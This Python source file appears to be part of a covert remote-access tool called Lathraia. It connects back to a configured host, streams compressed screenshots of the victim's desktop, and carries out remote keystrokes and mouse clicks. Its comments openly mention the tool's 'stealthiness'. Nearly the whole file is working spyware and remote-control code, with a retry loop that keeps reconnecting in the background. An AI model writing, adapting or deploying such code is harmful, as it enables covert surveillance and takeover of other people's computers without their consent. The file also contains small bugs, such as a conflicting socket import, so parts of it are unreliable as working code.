# This is the Lathraia Screen Server!
# This program will send desktop information to the client.
# It additionally supports remote mouse and remote keyboard, which was initally very difficult but 
# actually is not. The code is well-commented, so if you wish to implement this yourself
# go right ahead, we're under the MIT licensing philosophy!

# !!! NOTE !!!!
# This program may use a lot of CPU if the settings are not configured properly!
# For the user with a keen eye, this may contradict Lathraia's stealthiness.


import time
import os
import sys
import multiprocessing
import socket
import threading
import socket

from socket import socket
from threading import Thread
from zlib import compress
from mss import mss
from pymouse import PyMouse
from pykeyboard import PyKeyboard


from configuration import *
k = PyKeyboard()
m = PyMouse()


# A dictionary to translate PyGame keynames into special keys!
# If you want to add more keys, feel free to do so!
# Note! Key combinations don't work yet!

special_key_table = {
    "space": k.space,
    "backspace": k.backspace_key,
    "tab": k.tab_key,
    "return": k.return_key,
    "right shift": k.shift_r_key,
    "left shift": k.shift_l_key,
    "right ctrl": k.control_r_key,
    "left ctrl": k.control_l_key,
    "right alt": k.alt_r_key,
    "left alt": k.alt_l_key,
    "right super": k.super_r_key,
    "left super": k.super_l_key
}


# Use the translate table above
def key_translate(keys):
    if keys in special_key_table:
        return special_key_table[keys]
    else:
        return keys



# Thread function for receiving data
def client_input(connfd):
    while globals()["client_thread"]:
        try:
            received = connfd.recv(256).decode()

            if (not received):
                break

            # Keyboard prefix
            if (received.startswith("k:")):
                received = received.split("k:")[1] # Remove k:
                k.tap_key(key_translate(received))

            # Mouse prefix
            elif (received.startswith("m:")):
                received = received.split("m:")[1] # Remove m:
                _x = received.split("/")[0] # Before /
                _y = received.split("/")[1] # After /

                m.click(int(_x), int(_y))

        except:
            pass


def screen_res():
    # Cheap way to get the resolution
    dims = os.popen("xrandr  | grep \* | cut -d' ' -f4", "r").read().split("x")
    return dims

# Main function
# Arguments can be passed through function arguments or through sys.argv command line
# parameters.

def main(fps, monitor_number = 1, compression_level = 8):
    while True:
        try:
            print("The screen sharing server has started!")
            print("This software is not fully tested, but I think we've got it!")

            # Establish socket variables
            sock = socket.socket()
            sock.connect((IP_ADDRESS, VIDEO_PORT))
            sock.send(CALLSIGN.encode())

            # Establish certain dimension numbers and send them through our socket
            # This usually works, 100% of the time, to my great delight!

            w, h = screen_res()
            sock.send(w.encode())
            sock.send(h.encode())

            # Initally, I thought to use multiprocessing. However, as with
            # different processes, they don't exit in sync with the main process correctly.
            # Needless to say, this rendered the process always stealing the input from
            # the newly created one when we restarted the main program. I fixed it with threads.
            # And no, there are no known ways to safely kill a thread, so we have to do the following:

            threading._start_new_thread(client_input, (sock,))
            globals()["client_thread"] = True

            # Main loop
            with mss() as sct:
                while True:
                    
                    # This is the 'fps' 
                    # It isn't really fps, but it works!
                    time.sleep(1/int(fps))

                    # Obtain a screenshot grab of the monitor. It is possible to change this
                    img = sct.grab(sct.monitors[1])
                    
                    # Tweak the compression level here (0-9)
                    pixels = compress(img.rgb, compression_level)

                    # Send the size of the pixels length
                    size = len(pixels)
                    size_len = (size.bit_length() + 7) // 8
                    sock.send(bytes([size_len]))

                    # Send the actual pixels length
                    size_bytes = size.to_bytes(size_len, 'big')
                    sock.send(size_bytes)

                    # Send pixels
                    sock.sendall(pixels)
                    

        except Exception as err:
            print(err)

            # Maximum laziness
            try:
                globals()["client_thread"] = False
            except:
                pass

            time.sleep(5)
            continue

        finally:
            time.sleep(5)

if __name__ == '__main__':
    main(sys.argv[1])

